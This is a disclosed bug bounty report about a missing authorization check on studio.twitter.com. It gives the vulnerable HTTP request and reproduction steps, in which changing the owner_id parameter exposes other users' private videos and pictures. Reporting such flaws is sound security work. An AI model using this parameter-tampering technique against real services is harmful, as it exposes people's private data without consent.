# [Studio.twitter.com] See someone else pics 

## Report Details
- **Report ID**: 164649
- **URL**: https://hackerone.com/reports/164649
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-31T07:09:43.468Z
- **Disclosed**: 2017-06-22T04:52:24.643Z

## Reporter
- **Username**: anandpingsafe
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
Hi Team,

Below URL is missing authorisation where user A who is not having access to user B's data is able to view the video/pics by user.

Vulnerable request:

```
GET /1/library/list.json?account_id=4503599659510351&owner_id=12&limit=20&offset=0 HTTP/1.1
Host: studio.twitter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:37.0) Gecko/20100101 Firefox/37.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://studio.twitter.com/library
Cookie: 
Connection: keep-alive



```
Steps to reproduce:

1. Login to your studio.twitter.com account.
2. Go to studio.twitter.com/1/library/list.json?account_id=4503599659510351&owner_id=12&limit=20&offset=0 

Change the owner_id to see more of his private videos.

Thanks,
Anand

## Attachments
No attachments
